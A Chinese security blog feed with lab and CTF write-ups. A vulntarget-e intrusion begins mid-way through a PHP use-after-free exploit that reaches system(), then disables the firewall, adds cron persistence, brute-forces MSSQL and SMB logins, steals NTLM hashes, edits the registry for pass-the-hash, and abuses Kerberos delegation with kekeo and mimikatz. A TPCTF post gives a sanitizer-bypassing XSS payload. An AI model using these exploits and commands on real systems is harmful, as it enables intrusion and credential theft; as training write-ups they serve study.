<span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br><span class="line">    <span class="title function_ invoke__">gc_collect_cycles</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = <span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211162207215.png" alt="image-20231211162207215"></p><p>成功  确实能执行命令  但是有个点就是我们要提权 (原因就是这个机器开了防火墙  我们没有权限关掉)</p><p>讲一下在蚁剑不能上传文件的时候 我们可以怎么样上传文件 在外面扫端口的时候  <strong>发现了这个3333端口(就是外网主机)</strong>    但是呢我们却不知道其web路径在哪  于是呢   我们就可以使用到<code>ladon</code>这个工具了</p><p><img src="../images/image-20231211170824414.png" alt="image-20231211170824414"></p><p>找到其的web路径了  然后我们把自己想要上传的文件上传进去   然后在蚁剑的脚本处wget就可以把我们想要的文件上传到linux机器上了</p><p>类似这样</p><p><img src="../images/image-20231211171020672.png" alt="image-20231211171020672"></p><p><strong>(就是因为使用了这个方法上传了这个马  我们在接下来的操作中才可以上线该机器)</strong></p><p>但是查了半天发现  提权不成功  然后在翻home目录的过程中  发现了有个key文件</p><p><img src="../images/image-20231211162928178.png" alt="image-20231211162928178"></p><p>将其下载下来   看看能不能当作私钥来进行登录<img src="../images/image-20231211163237940.png" alt="image-20231211163237940"></p><p>真的可以  于是直接关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ufw disable#关闭防火墙</span><br><span class="line"></span><br><span class="line">ufw status#查看防火墙状态</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211163522806.png" alt="image-20231211163522806"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dig @8.8.8.8 www.baidu.com#DNS判断出网</span><br><span class="line">curl http://www.baidu.com# HTTP判断出网</span><br><span class="line">curl https://www.baidu.com# HTTPS判断出网</span><br><span class="line">TCP协议可以上传NC工具来判断出网</span><br><span class="line"></span><br><span class="line">//记录个细节  就是每次拿下一台机器后呢  可以使用这些命令来判断一下  主机哪些协议出网  哪些协议不出网</span><br></pre></td></tr></table></figure><p>然后写个定时任务  防止shell断了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;* * * * * /www/wwwroot/vulntarget-e2/1.elf&quot; | crontab -  //写定时任务  </span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211164113671.png" alt="image-20231211164113671"></p><p><img src="../images/image-20231211164213592.png" alt="image-20231211164213592"></p><p>成功上线  然后开始收集信息 </p><p><img src="../images/image-20231211164350865.png" alt="image-20231211164350865"></p><p>然后使用msf来上传fscan开扫</p><p><img src="../images/image-20231211164445929.png" alt="image-20231211164445929"></p><p>发现可以ping通  那么应该防火墙没开 </p><p><img src="../images/image-20231211164604580.png" alt="image-20231211164604580"></p><p>这个windows机器应该是内网机器了  存在vulntarget.com这个域  并且存在1433端口  我们使用msf来爆破一下其账号密码</p><p><img src="../images/image-20231211165901256.png" alt="image-20231211165901256"></p><p><strong>不能使用crackmapexec 因为爆破的用户名不在域中  所以会爆破失败</strong></p><p>弱口令爆破成功  <code>test/123.com</code></p><p>直接连接上去</p><p><img src="../images/image-20231211170044321.png" alt="image-20231211170044321"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-mssqlclient test:123.com@192.168.88.102</span><br></pre></td></tr></table></figure><p>成功连接上去了  然后判断一下权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">判断是否是SA权限</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)     </span><br><span class="line">判断是否是db_owner权限  </span><br><span class="line">select is_member(&#x27;db_owner&#x27;)</span><br><span class="line">判断是否是public权限</span><br><span class="line">select is_srvrolemember(&#x27;public&#x27;)</span><br></pre></td></tr></table></figure><p>不幸的是  这是最低权限  写函数getshell啥的都干不了了 </p><p>但是呢  sqlserver低权限有个技巧就是  可以打中继攻击</p><p><strong>像一些函数无法去开启执行，但是想到sql server数据库里面有xp_dirtree这个存储，可以利用他去请求UNC，然后获取net-ntlm hash，因为这个普通权限就能执行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use auxiliary/admin/mssql/mssql_ntlm_stealer</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211171630485.png" alt="image-20231211171630485"></p><p><img src="../images/image-20231211171641785.png" alt="image-20231211171641785"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python3 Responder.py -I ens37 -v</span><br><span class="line"></span><br><span class="line">//这里的话去GitHub项目找的话  记得选第二个分支 第二个分支才是python3 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211171605569.png" alt="image-20231211171605569"></p><p>收集到这个机器用户的hash值</p><p>但是没啥用 然后离谱的是获取到这个机器的用户的账号密码也是爆破出来的…………………….</p><p><code>win2008/qweASD123</code>   虽然说获取到了这个账号  但是还是连接不上去  </p><p><img src="../images/image-20231211172327805.png" alt="image-20231211172327805"></p><p>去找了一圈也不知道是啥原因…………</p><p><strong>这里知道是啥原因了(  把LocalAccountTokenFilterPolicy设置为1，否则后面用户在PTH的时候会爆<code>[-] rpc_s_access_denied</code>错误)</strong></p><p><img src="../images/image-20231214175917808.png" alt="image-20231214175917808"></p><p><img src="../images/image-20231214180050331.png" alt="image-20231214180050331"></p><p>确实是不存在该值</p><p><img src="../images/image-20231214180155969.png" alt="image-20231214180155969"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后再rdp或者或者pth攻击连接的时候  记得先加上这一条</p><p>然后更加离谱的是 本地管理员的账号密码也可以爆破出来 </p><p><code>administrator/admin@123</code>   然后这个是可以连接上去的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 192.168.88.102 -u administrator -p admin@123 --local-auth 这个命令是只看本机上的这个用户  不看域  (不然会被当成域控了)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211172603716.png" alt="image-20231211172603716"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py administrator:&#x27;admin@123&#x27;@192.168.88.102</span><br></pre></td></tr></table></figure><p>成功连接上去  然后就是开启3389端口  然后RDP上去  还是老样子  因为机器没有<code>.Net</code>语言环境   所以我们的sharphound跑不了  如果换成python的话sharphound的话也是同样跑不了 ………………</p><p>那么我们就先RDP上去  然后使用本地管理员账户登录  然后上传马  上线</p><p><img src="../images/image-20231211174217507.png" alt="image-20231211174217507"></p><p>也是存在双网卡  然后直接上传fscan上去开扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">10.0.10.10:53 open</span><br><span class="line">10.0.10.10:80 open</span><br><span class="line">10.0.10.10:88 open</span><br><span class="line">10.0.10.9:135 open</span><br><span class="line">10.0.10.10:139 open</span><br><span class="line">10.0.10.9:139 open</span><br><span class="line">10.0.10.10:135 open</span><br><span class="line">10.0.10.10:53 open</span><br><span class="line">10.0.10.10:88 open</span><br><span class="line">10.0.10.10:80 open</span><br><span class="line">10.0.10.10:389 open</span><br><span class="line">10.0.10.9:445 open</span><br><span class="line">10.0.10.10:445 open</span><br><span class="line">10.0.10.10:464 open</span><br><span class="line">10.0.10.10:593 open</span><br><span class="line">10.0.10.10:636 open</span><br><span class="line">10.0.10.9:1234 open</span><br><span class="line">10.0.10.9:1433 open</span><br><span class="line">10.0.10.10:3268 open</span><br><span class="line">10.0.10.10:3269 open</span><br><span class="line">10.0.10.10:5985 open</span><br><span class="line">10.0.10.10:135 open</span><br><span class="line">10.0.10.9:135 open</span><br><span class="line">10.0.10.9:139 open</span><br><span class="line">10.0.10.10:139 open</span><br><span class="line">10.0.10.10:9389 open</span><br><span class="line">10.0.10.9:47001 open</span><br><span class="line">10.0.10.9:49152 open</span><br><span class="line">10.0.10.9:49156 open</span><br><span class="line">10.0.10.9:49155 open</span><br><span class="line">10.0.10.9:49154 open</span><br><span class="line">10.0.10.9:49153 open</span><br><span class="line">10.0.10.9:49481 open</span><br><span class="line">10.0.10.10:49666 open</span><br><span class="line">10.0.10.10:49667 open</span><br><span class="line">10.0.10.10:49669 open</span><br><span class="line">10.0.10.10:49670 open</span><br><span class="line">10.0.10.10:49672 open</span><br><span class="line">10.0.10.10:49685 open</span><br><span class="line">10.0.10.10:49698 open</span><br><span class="line">10.0.10.10:389 open</span><br><span class="line">10.0.10.10:65105 open</span><br><span class="line">10.0.10.9:445 open</span><br><span class="line">10.0.10.10:445 open</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.10.9</span><br><span class="line">   [-&gt;]WIN-N4DK5RPD2QU</span><br><span class="line">   [-&gt;]10.0.10.9</span><br><span class="line">   [-&gt;]192.168.88.102</span><br><span class="line">[+] 10.0.10.9   MS17-010    (Windows Server 2008 HPC Edition 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.10.10</span><br><span class="line">   [-&gt;]WIN-1PV25H8UJPN</span><br><span class="line">   [-&gt;]10.0.10.10</span><br><span class="line">[*] NetBios: 10.0.10.9       WIN-N4DK5RPD2QU.vulntarget.com      Windows Server 2008 HPC Edition 7601 Service Pack 1 </span><br><span class="line">[*] WebTitle: http://10.0.10.9:47001    code:404 len:315    title:Not Found</span><br><span class="line">[*] NetBios: 10.0.10.10      [+]DC WIN-1PV25H8UJPN.vulntarget.com      Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] 10.0.10.10  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle: http://10.0.10.10:5985    code:404 len:315    title:Not Found</span><br><span class="line">[*] WebTitle: http://10.0.10.10         code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] http://10.0.10.10 poc-yaml-active-directory-certsrv-detect </span><br></pre></td></tr></table></figure><p>发现DC了  然后还是老样子  上代理</p><p><img src="../images/image-20231211174738336.png" alt="image-20231211174738336"></p><p>能够访问  代理成功  然后开始打域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">使用</span><br><span class="line">AdFind.exe -h 192.168.88.102 -u win2008 -up qweASD123  -b &quot;DC=nami,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto </span><br><span class="line"></span><br><span class="line">发现win2008这个用户存在资源委派  然后我们就可以直接打了</span><br><span class="line">使用kekeo进行一个票据的请求</span><br><span class="line">tgt::ask /user:win2008 /domain:vulntarget.com /password:qweASD123 /ticket:ash.kirbi</span><br><span class="line">申请administrator权限的票据</span><br><span class="line">tgs::s4u /tgt:TGT_win2008@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/WIN-1PV25H8UJPN.vulntarget.com</span><br><span class="line">mimikatz注入票据</span><br><span class="line">kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~WIN-1PV25H8UJPN.vulntarget.com@VULNTARGET.COM.kirbi</span><br><span class="line"></span><br><span class="line">dir访问</span><br><span class="line">dir \\WIN-1PV25H8UJPN.vulntarget.com\C$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这里本来是想用Rubeus.exe这个工具的  但是这个工具和sharphound一样  想要.Net环境  但是kekeo.exe这个工具不需要  所以直接用这个工具来打就行了</span><br></pre></td></tr></table></figure><p>然后就结束了<img src="../images/image-20231211175209631.png" alt="image-20231211175209631"></p><p>可以这样子打  然后开启3389端口  然后连接上去  使用wmiexec也行 但是不建议使用proxychains来连  因为会失败(不知道为啥)   建议直接开proxifier  然后使用物理机来执行wmiexec</p><p><strong>(还有这里有个骚操作就是在139 / 445端口开的时候  我们有了账号密码  在不能RDP上去的时候  我们可以先使用smbclient连接  然后上传文件上去)</strong></p><p>还有就是在win2012用户的server  我们获取到这个明文密码的方法就是</p><p><a href="https://blog.csdn.net/weixin_30883311/article/details/102451254">https://blog.csdn.net/weixin_30883311/article/details/102451254</a></p><p><a href="https://xuwp.top/Operating-System-Security.html#%E4%BD%BF%E7%94%A8Windows%E4%B8%AD%E7%9A%84PKI">https://xuwp.top/Operating-System-Security.html#%E4%BD%BF%E7%94%A8Windows%E4%B8%AD%E7%9A%84PKI</a></p><p><a href="https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH%E6%93%8D%E4%BD%9C/mimikatz/Procdump64+mimikatz.md">https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH%E6%93%8D%E4%BD%9C/mimikatz/Procdump64+mimikatz.md</a></p><p>这三个链接  第一个是包含这个这个可以强制锁屏的命令  然后其他两个就是导出lass的然后解出明文的一个方法</p><p><strong>三层内网代理  绕过 免杀  (挺好的这个靶场  有一点不足的就是这个靶机的话最后拿下win2008这台机子的方法有点牵强)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;从a打到e  我个人感觉e是最好的  可以学到挺多东西的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231211145027877.png&quot; alt=&quot;image-20231211145027877&quot;&gt;&lt;/p&gt;
&lt;p&gt;这个是整个靶机所用到的机器 </summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>TPCTF2023-walk off the earth</title>
    <link href="https://ke1nys.github.io/posts/f07ab6bb.html"/>
    <id>https://ke1nys.github.io/posts/f07ab6bb.html</id>
    <published>2023-12-06T02:44:32.000Z</published>
    <updated>2023-12-06T02:51:48.630Z</updated>
    
    <content type="html"><![CDATA[<p>参考的是<a href="https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-earth">https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-earth</a>  这篇文章</p><p>pow计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">base = <span class="string">&#x27;abd3d4a91f15fbc0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">suffix</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Concatenate the base and suffix</span></span><br><span class="line">    data = base + suffix</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Calculate the SHA256 hash</span></span><br><span class="line">    hash_value = hashlib.sha256(data.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check if the hash value starts with &#x27;0000000(7)&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> hash_value.startswith(<span class="string">&#x27;0000000&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">pwnlib.util.iters.mbruteforce(test, string.digits + string.ascii_letters + string.punctuation, <span class="number">8</span>,<span class="string">&#x27;fixed&#x27;</span>)</span><br></pre></td></tr></table></figure><p>漏洞点</p><p><img src="../images/image-20231206104624902.png" alt="image-20231206104624902"></p><p>就是在我们输入的js代码后  运行超时后  就会进行catch进行抛出异常  return返回flag<strong>(res就是flag)</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/note?text=&lt;form&gt;+&lt;math&gt;&lt;mtext&gt;+&lt;%2Fform&gt;&lt;form&gt;+&lt;mglyph&gt;+&lt;style&gt;&lt;%2Fmath&gt;&lt;script+src%3D%27https://app.requestly.io/delay/5000/www.baidu.com%27&gt;&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domcontentloaded`不会等`img src`但是会等`script src</span><br></pre></td></tr></table></figure><p>在本地调试了一下  发现在waf这个地方<img src="../images/image-20231206104901259.png" alt="image-20231206104901259"></p><p><code>node.tagName</code>这个东西在循环到<code>style</code>的时候就停止循环了  就不接着往下查找了  然后就可以导致<code>script</code>可以绕过过滤了  <strong>(这个原因不知道为啥  于是写篇文章来记录一下  看看啥时候有大佬写原理)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考的是&lt;a href=&quot;https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-earth&quot;&gt;https://boogipop.com/2023/12/01/TPCTF%2020</summary>
      
    
    
    
    
    <category term="TPCTF2023" scheme="https://ke1nys.github.io/tags/TPCTF2023/"/>
    
  </entry>
  
  <entry>
    <title>JQCTF-Web复现</title>
    <link href="https://ke1nys.github.io/posts/f7872afc.html"/>
    <id>https://ke1nys.github.io/posts/f7872afc.html</id>
    <published>2023-12-05T11:05:58.000Z</published>
    <updated>2023-12-06T02:51:48.628Z</updated>
    
    <content type="html"><![CDATA[<h2 id="solo-php"><a href="#solo-php" class="headerlink" title="solo-php"></a>solo-php</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test_upload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="keyword">new</span> <span class="title function_ invoke__">check</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">checkname</span>(<span class="variable">$this</span>-&gt;filename)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkname</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span 